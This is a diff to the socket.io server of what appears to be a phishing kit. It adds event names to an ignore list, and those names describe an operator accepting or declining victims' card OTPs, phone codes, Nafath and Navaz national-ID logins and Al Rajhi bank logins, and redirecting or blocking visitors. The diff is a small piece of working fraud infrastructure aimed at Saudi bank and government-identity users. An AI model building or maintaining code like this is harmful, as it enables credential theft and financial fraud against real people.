@@ -772,10 +772,18 @@ const IGNORED_ANY_EVENTS = new Set([
   // admin -> client control events (not visitor submissions)
   "acceptService", "declineService", "acceptPaymentForm", "declinePaymentForm",
   "acceptPhone", "declinePhone", "acceptVisaOtp", "declineVisaOtp",
-  "acceptPhoneOtp", "declinePhoneOtp", "acceptNavaz", "declineNavaz",
+  "acceptPhoneOtp", "declinePhoneOtp", "acceptPhoneOTP", "declinePhoneOTP",
+  "acceptMobOtp", "declineMobOtp", "acceptMotslOtp", "declineMotslOtp",
+  "acceptStcPhoneOtp", "declineStcPhoneOtp", "acceptSTC", "declineSTC",
+  "acceptNavaz", "declineNavaz", "acceptNafath", "declineNafath",
+  "acceptNaflogin", "declineNaflogin", "acceptNafselogin", "declineNafselogin",
+  "acceptRajlogin", "declineRajlogin", "acceptRajhi", "declineRajhi",
   "adminRedirect", "clientBlocked", "changeNavazCode",
+  "nafathNumber", "nafathCode", "sendNafathNumber", "setNafathNumber",
   "payment:action", "otp:action", "nafath:action", "naflogin:action",
-  "phone:action", "admin:redirect",
+  "rajlogin:action", "phone:action", "admin:redirect", "nafath:code",
+  "user:blocked",
+
 ]);
 
 io.on("connection", (socket) => {
